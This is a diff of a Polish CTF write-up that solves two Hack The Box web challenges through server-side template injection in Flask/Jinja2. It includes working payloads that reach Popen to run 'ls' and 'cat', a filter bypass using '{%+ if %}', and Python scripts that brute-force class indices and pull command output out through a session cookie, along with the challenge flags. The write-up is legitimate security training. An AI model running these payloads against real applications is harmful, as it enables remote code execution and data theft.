@@ -80,16 +80,86 @@ Uwaga screeny od tego miejsca będą się różnic, ponieważ musiałem oddać m
 ### 2.3 Zadanie 3
 **Nazwa:** Templated
 **Punkty:** 20 
-**Flaga** HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!
+**Flaga** HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
 1. Wchodzę na stronę i jedyna sensowna treść jak się ukazuję to: `Proudly powered by Flask/Jinja2`
 2. Wipsuję w wyszukiwarke: `hack Flask/Jinja2`, znajduję taki artykuł https://blog.nvisium.com/p263
-3. Sprawdzam czy są gdzieś na stronie wyświetlane dane przekazane prze użytkownika. Są wystarczy wpisać: `http://188.166.168.204:31061/page` i w odpowiedzi dostajemy `The page page could not be found`, a więc możemy w to miejśce próbować wstrzyknąć jakiś złośliwy kod.
-4. Aby wykonać kod wewnątrz templatu należy umieścić go w: `{{ ... }}`
-5. Z wyżej wskazanego poradnika dowiaduję się, że w kontekście templatu jest dostępny obiekt o nazwie `request`
-6. Pobieram kod żródłowy flaska(https://github.com/pallets/flask.git), aby odnaleźć tam `request` i zobaczyć z czego się składa, okazuję się, że flask jest wraperem wokół `werkzeug` i to w jego kodzie znaujduję klasa `request` https://github.com/pallets/werkzeug/blob/master/src/werkzeug/wrappers/request.py , ale nic mi sie narazie nie rzuca w oczy
-7. Chciałbym odczytać pliki serwera bo pewnie gdzieś tam jest zakodowana flaga, w konsoli pythona (lokalnie) wykonuje takie polecenie `>>> __builtins__.__import__('os')`, które pozwala mi uzyskać dostęp do modułu `os` który z koleji pozwoliłby mi dostać się do wszystkich plików, lecz wstrzykiwane nie wykonuję się poprawnie.
-8. Natknałem się na następny opis tej podatnośći, `https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee`, opisany tam exploit polega na przeszukaniu drzewa klas w pythonie i dostania się w ten sposób do takiej która umożliwi nam egzekucje kodu. Wykorzystane są do tego wbudowane metody pythona `__mro__` - do wyświetlenia wszystkich klas (jest to kolejność w jakiej są ładowane klasy, dlatego powinniśmy wywołać ją na jakieś nisko pzoiomowej klasie jak `object`)
-9. Następnie w drzewie klas otrzymanych poleceniem `1.__class__.__mro__[1].__subclasses__()` (wszystkie klasy dziedziczące po klasie `object` w tym projekcie), należało znaleźć klasę która umożliwi odczyt plików, ctrl+f i widać ze istnieje klasa `Popen` która służy do otwierania podprocesów, ma indeks [414] (zgadnięty drogą prób i błędów)
-10. Wylistowanie istniejących plików: `1.__class__.__mro__[1].__subclasses__()[414](["ls","-la"],stdout=-1).communicate()`, w outpucie widać plik flag.txt :)
-11. Odczytanie flagi (plik flag.txt): `1.__class__.__mro__[1].__subclasses__()[414](["cat","flag.txt"],stdout=-1).communicate()`
-12. Rezultat: ![image](zad3/flag3.png)
+3. `Jinja2` to silnik templatek, który możeby być podatny na tak zwane ataki `Server-Side Template Injections`, czyli wstrzykiwanie złośliwego kodu do silników renderujących najcześciej strony html.
+4. Sprawdzam czy są gdzieś na stronie wyświetlane dane przekazane prze użytkownika. Są wystarczy wpisać: `http://188.166.168.204:31061/page` i w odpowiedzi dostajemy `The page page could not be found`, a więc możemy w to miejśce próbować wstrzyknąć jakiś złośliwy kod.
+5. Aby wykonać kod wewnątrz templatu należy umieścić go w: `{{ ... }}`
+6. Z wyżej wskazanego poradnika dowiaduję się, że w kontekście templatu jest dostępny obiekt o nazwie `request`
+7. Pobieram kod żródłowy flaska(https://github.com/pallets/flask.git), aby odnaleźć tam `request` i zobaczyć z czego się składa, okazuję się, że flask jest wraperem wokół `werkzeug` i to w jego kodzie znaujduję klasa `request` https://github.com/pallets/werkzeug/blob/master/src/werkzeug/wrappers/request.py , ale nic mi sie narazie nie rzuca w oczy
+8. Chciałbym odczytać pliki serwera bo pewnie gdzieś tam jest zakodowana flaga, w konsoli pythona (lokalnie) wykonuje takie polecenie `>>> __builtins__.__import__('os')`, które pozwala mi uzyskać dostęp do modułu `os` który z koleji pozwoliłby mi dostać się do wszystkich plików, lecz wstrzykiwane nie wykonuję się poprawnie.
+9. Natknałem się na następny opis tej podatnośći, `https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee`, opisany tam exploit polega na przeszukaniu drzewa klas w pythonie i dostania się w ten sposób do takiej która umożliwi nam egzekucje kodu. Wykorzystane są do tego wbudowane metody pythona `__mro__` - do wyświetlenia wszystkich klas (jest to kolejność w jakiej są ładowane klasy, dlatego powinniśmy wywołać ją na jakieś nisko pzoiomowej klasie jak `object`)
+10. Następnie w drzewie klas otrzymanych poleceniem `1.__class__.__mro__[1].__subclasses__()` (wszystkie klasy dziedziczące po klasie `object` w tym projekcie), należało znaleźć klasę która umożliwi odczyt plików, ctrl+f i widać ze istnieje klasa `Popen` która służy do otwierania podprocesów, ma indeks [414] (zgadnięty drogą prób i błędów)
+11. Wylistowanie istniejących plików: `1.__class__.__mro__[1].__subclasses__()[414](["ls","-la"],stdout=-1).communicate()`, w outpucie widać plik flag.txt :)
+12. Odczytanie flagi (plik flag.txt): `1.__class__.__mro__[1].__subclasses__()[414](["cat","flag.txt"],stdout=-1).communicate()`
+13. Rezultat: ![image](zad3/flag3.png)
+
+<div style="page-break-after: always"></div>
+
+### 2.4 Zadanie 4
+**Nazwa:** baby ninja jinja
+**Punkty:** 30 
+**Flaga** HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}
+1. Wchodze na stronę zwracam uwagę na nagłówek `Server: Werkzeug/1.0.1 Python/2.7.17`, który wskazuję, że mamy ponownie do czynienia z flaskiem. A tytuł `baby ninja jinja` może sugerować, że mamy znowu do czynienia z atakami z kategori `SSTI`.
+2. Próbuję zastosować, w jednymy dostępnym formularzu podstawowe sprawdzenie takie jak: `{{ 2 + 2 }}`, lecz są one nie sktueczne. Ponadto w odpowiedzi nie znajduję żadnych treści które przekazałem, co może świadczyć o tym że przekazane dane nie są wgl porcesowane.
+3. Przeglądając kod HTML głównej strony napotkałem na komentarz `<!-- /debug -->`, przechodzę pod adres `http://206.189.121.131:32117/debug` i w odpowiedzi otrzymuję kod źródłowy serwera.
+4. Analiza kodu:
+   1. Znaczniki pozwalające osadzić kod(`{{}}`) są wycinane: ```db.text_factory = (lambda s: s.replace('{{', '').
+            replace("'", '&#x27;').
+            replace('"', '&quot;').
+            replace('<', '&lt;').
+            replace('>', '&gt;')
+        )```
+    2. Widzimy również, aby server zwrócił templatkę o nazwie report musimy posiadać klucz `leader` w sesji - ```report = render_template_string(acc_tmpl.
+                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
+                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
+            )
+
+            if session.get('leader'): 
+                return report```
+    3. Trzecie sporzetrzeżenie to możliwy, brak zabezpieczenia przed SqlInjection.
+5. Aby ustawić sesję trzeba ustawić nagłówek `Cookie: ...`, ale trzeba go również odpowiednio zaszyfrować, szyfr generowany jest losowo `os.urandom(120)`, a więc go nie zgadniemy :(, pozostaje nam ustawienie sesji po stronie serwer, czyli wykonanie kod zdalnie
+6. W [dokumentacji](https://jinja.palletsprojects.com/en/2.11.x/templates/#whitespace-control) Jinja znalazłem sposób  w jaki można wykonać kod bez użycią `{{`, dyrektywa `if` ma tylko jeden taki blok :) - `{%+ if something %}yay{% endif %}`
+7. Próbowałem wykonać przykładowe kod i okazało się, że aplikacja jest w `debug mode`, przez co wyświetlac się stack trace, jeśli coś pójdzie nie tak. Dostępny jest również dostęp do konsoli python'a z poziomu stack-tracu, lecz trzeba znać pina. Po szybkim przeszukaniu internetu nie znalazłem żadnego prostego sposobu na znalezienie takiego pinu. Konsola znajduję sie równiez pod `/console`.
+8. Idąc tropem SSTI udało mi się skontruować takie query: `?leader=leader&name={%+if session.update({request.args.leader:1}) %}yay{% endif %}` - jego działanie to: `session['leader']=1`, przez co w odpowiedzi otrzumujemy template `report`
+9. Dzięki temu w odpowiedzi z serwera znajdowało się już odopowiednio zakodowane ciasteczko: `eyJsZWFkZXIiOjF9.YGCGJA.yDwEUWkJuEkcipxY5wl6p3EE3zI`, którego będę mógł od tej pory używać
+10. Postanowiłem pójść inną drogą ponieważ, nie mogłem znaleźć sposóbu na wyświetlanie danych. Postanowiłem je przekazywac w ciasteczku `session`. Mogę dowolonie modyfikować zawrtość tej sesji. Znalazłem pakiet o nazwie `flask-unsign`, który umozliwia dekdowanie ciasteczek
+11. Napisałem prosty skrypt którym pozwoli mi zlokalizowac Klasę `Popen`, która wykorzytam jak w zadaniu 2.3
+```python
+URL="http://178.62.54.33:31649/"
+session = requests.session()
+for i in range(0,300):
+    print(i)
+    response = session.get(URL + "?leader=leader&name={%+if session.update({request.args.leader:1.__class__.__mro__[1].__subclasses__()["+str(i)+"]}) %}yay{% endif %}")
+    print(str(i) + " : " + response.text[-70:-1])
+    if "Popen" in response.text[-70:-1]:
+        print("!!!!!!!!!!!!!!!!" + str(i))     
+    time.sleep(0.7)
+    # wynik: 258
+```
+12. Wylistowanie plików: `?command=ls&leader=leader&name={%+if session.update({request.args.leader:1.__class__.__mro__[1].__subclasses__()[258]([request.args.command],stdout=-1).communicate()}) %}yay{% endif %}`, rezultat:
+```bash
+app.py
+flag_P54ed
+schema.sql
+static
+templates
+```
+13. Przejrzenie pliku flag_P54ed `"?command=cat&arg=flag_P54ed&leader=leader&name={%+if session.update({request.args.leader:1.__class__.__mro__[1].__subclasses__()[258]([request.args.command, request.args.arg],stdout=-1).communicate()}) %}yay{% endif %}"`
+14. Ostateczny skrypt:
+```python
+import flask_unsign
+import requests
+import time
+URL="http://178.62.54.33:31649/"
+session = requests.session()
+response = session.get(URL + "?command=cat&arg=flag_P54ed&leader=leader&name={%+if session.update({request.args.leader:1.__class__.__mro__[1].__subclasses__()[258]([request.args.command, request.args.arg],stdout=-1).communicate()}) %}yay{% endif %}")
+payload = session.cookies.get_dict()['session']
+decoded = flask_unsign.decode(payload)['leader'][0].decode("utf-8")
+print(decoded)
+```
+15. Na koniec jeszcze wpadłem na pomysł, że mogłem wyświetlać dane, wywołując wyjątki których treścią byłaby treść która chciałbym przekazać z serwera.
+16. Rezultat: ![image](zad4/flag4.png)
+
+<div style="page-break-after: always"></div>
